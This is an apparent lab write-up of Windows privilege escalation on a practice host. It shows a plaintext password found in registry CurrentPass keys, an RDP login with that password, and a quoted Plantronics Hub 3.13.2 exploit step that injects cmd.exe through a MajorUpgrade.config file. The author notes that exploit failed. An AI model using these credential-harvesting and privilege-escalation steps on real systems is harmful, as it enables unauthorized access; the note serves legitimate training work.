# 7 privesc\_2 Plantronics Hub 3.13.2

### PEAS

```
͹ Enumerating saved credentials in Registry (CurrentPass)
    HKLM\System\ControlSet001\Control\CurrentPass                  :   TwilightAirmailMuck234
    HKLM\System\ControlSet002\Control\CurrentPass                  :   TwilightAirmailMuck234
    HKLM\System\CurrentControlSet\Control\CurrentPass              :   TwilightAirmailMuck234

$ xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:192.168.175.70 /u:jane /p:TwilightAirmailMuck234 
# rdp as MEATHEAD/jane
Plantronics Hub 3.13.2
Using https://www.exploit-db.com/exploits/47845

# Steps for exploitation (PoC):
# - Open cmd.exe 
# - Navigate using cd C:\ProgramData\Plantronics\Spokes3G
# - echo %username%^|advertise^|C:\Windows\System32\cmd.exe > MajorUpgrade.config

# didn't work for me.
```
